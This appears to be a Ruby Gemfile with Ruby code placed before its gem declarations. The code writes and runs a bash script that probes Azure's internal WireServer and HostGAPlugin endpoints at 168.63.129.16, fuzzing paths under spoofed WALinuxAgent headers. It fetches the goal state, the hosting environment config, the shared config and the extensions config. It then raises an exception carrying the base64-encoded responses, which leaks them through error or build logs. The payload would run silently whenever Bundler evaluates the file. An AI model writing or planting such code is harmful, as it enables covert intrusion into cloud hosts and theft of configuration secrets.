require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v120; rm -rf "$WD" && mkdir "$WD" && cd "$WD"

# Default request
curl -sf -o vm_default.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
echo "STEP_DEFAULT_LEN=$(wc -c < vm_default.json)"
echo "STEP_DEFAULT_SHA=$(sha256sum vm_default.json | head -c 16)"

# Request with arbitrary param
curl -sf -o vm_param.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01&vmId=00000000-0000-0000-0000-000000000001"
echo "STEP_PARAM_LEN=$(wc -c < vm_param.json)"
echo "STEP_PARAM_SHA=$(sha256sum vm_param.json | head -c 16)"

# DIFF
echo "===DIFF_SIZES==="
ls -l vm_default.json vm_param.json
echo "===FIRST_500_OF_PARAM==="
echo "STEP_PARAM_FIRST_500_B64=$(head -c 500 vm_param.json | base64 -w0)"
echo "===LAST_500_OF_PARAM==="
echo "STEP_PARAM_LAST_500_B64=$(tail -c 500 vm_param.json | base64 -w0)"

# Diff: which keys does param have that default doesn't?
python3 -c "
import json
d_def = json.load(open('vm_default.json'))
d_par = json.load(open('vm_param.json'))
print('STEP_DEFAULT_KEYS=' + str(sorted(d_def.keys())))
print('STEP_PARAM_KEYS=' + str(sorted(d_par.keys())))
def_keys = set(d_def.keys())
par_keys = set(d_par.keys())
print('STEP_ONLY_IN_PARAM=' + str(par_keys - def_keys))
print('STEP_ONLY_IN_DEFAULT=' + str(def_keys - par_keys))
# Compare extensionGoalStates
print('STEP_DEFAULT_EGS_COUNT=' + str(len(d_def.get('extensionGoalStates',[]))))
print('STEP_PARAM_EGS_COUNT=' + str(len(d_par.get('extensionGoalStates',[]))))
for i, e in enumerate(d_par.get('extensionGoalStates', [])):
    print(f'STEP_PARAM_EGS_{i}_NAME=' + e.get('name','') + ' ' + e.get('state',''))
"

# Compare top-level fields one by one
echo "===FIELD_BY_FIELD_DIFF==="
python3 -c "
import json
d_def = json.load(open('vm_default.json'))
d_par = json.load(open('vm_param.json'))
for k in sorted(set(list(d_def.keys()) + list(d_par.keys()))):
    v_def = d_def.get(k, '<missing>')
    v_par = d_par.get(k, '<missing>')
    s_def = json.dumps(v_def, default=str)[:80] if v_def != '<missing>' else '<missing>'
    s_par = json.dumps(v_par, default=str)[:80] if v_par != '<missing>' else '<missing>'
    marker = '==' if s_def == s_par else '!='
    print(f'KEY={k} {marker} DEF={s_def} PAR={s_par}')
"

# Path enumeration on HostGAPlugin (FIXED — no PATH variable!)
echo "===HGP_PATH_FUZZ_FIXED==="
for P_TRY in /vmSettings /vmsettings /vmSettings/0 /machine /machine/extensions /vmStatus /status /api/vmSettings /v1/vmSettings /v2/vmSettings /api/v1/instance; do
  curl -s -m 5 -o p.bin -w "PATH=$P_TRY HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16:32526$P_TRY"
done

# WireServer paths
echo "===WIRESERVER_PATHS==="
for P_TRY in "/machine/?comp=goalstate" "/machine/?comp=acquired" "/machine/?comp=health" "/machine/?comp=hostingenvironmentconfig" "/machine/?comp=sharedconfig" "/machine/?comp=extensionsconfig" "/machine/?comp=versions" "/?comp=versions" "/machine/" "/admin/"; do
  curl -s -m 5 -H "x-ms-version: 2015-04-05" -H "x-ms-agent-name: WALinuxAgent" -o w.bin -w "P=$P_TRY HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16$P_TRY"
done

# HostingEnvironmentConfig fetch
echo "===HOSTING_ENV==="
curl -s -m 10 -H "x-ms-version: 2015-04-05" -H "x-ms-agent-name: WALinuxAgent" -o gs.xml -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/machine/?comp=goalstate"
HEC=$(grep -oE '<HostingEnvironmentConfig>[^<]+' gs.xml | sed 's|<HostingEnvironmentConfig>||')
echo "HEC_RAW=$HEC"
if [ -n "$HEC" ]; then
  HEC_DEC=$(python3 -c "import html; print(html.unescape('$HEC'))")
  echo "HEC_DEC=$HEC_DEC"
  curl -s -m 10 -H "x-ms-version: 2015-04-05" -H "x-ms-agent-name: WALinuxAgent" -o hec.xml -w "HEC_HTTP=%{http_code} LEN=%{size_download}\n" "$HEC_DEC"
  echo "HEC_PREVIEW=$(head -c 600 hec.xml)"
fi

# Try SharedConfig
SC=$(grep -oE '<SharedConfig>[^<]+' gs.xml | sed 's|<SharedConfig>||')
if [ -n "$SC" ]; then
  SC_DEC=$(python3 -c "import html; print(html.unescape('$SC'))")
  echo "SC_DEC=$SC_DEC"
  curl -s -m 10 -H "x-ms-version: 2015-04-05" -H "x-ms-agent-name: WALinuxAgent" -o sc.xml -w "SC_HTTP=%{http_code} LEN=%{size_download}\n" "$SC_DEC"
  echo "SC_PREVIEW=$(head -c 600 sc.xml)"
fi

# Try ExtensionsConfig
EC=$(grep -oE '<ExtensionsConfig>[^<]+' gs.xml | sed 's|<ExtensionsConfig>||')
if [ -n "$EC" ]; then
  EC_DEC=$(python3 -c "import html; print(html.unescape('$EC'))")
  echo "EC_DEC=$EC_DEC"
  curl -s -m 10 -H "x-ms-version: 2015-04-05" -H "x-ms-agent-name: WALinuxAgent" -o ec.xml -w "EC_HTTP=%{http_code} LEN=%{size_download}\n" "$EC_DEC"
  echo "EC_PREVIEW=$(head -c 1200 ec.xml)"
fi
SHELL
Tempfile.create('v120.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v120 " + line.chomp[0..1500] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
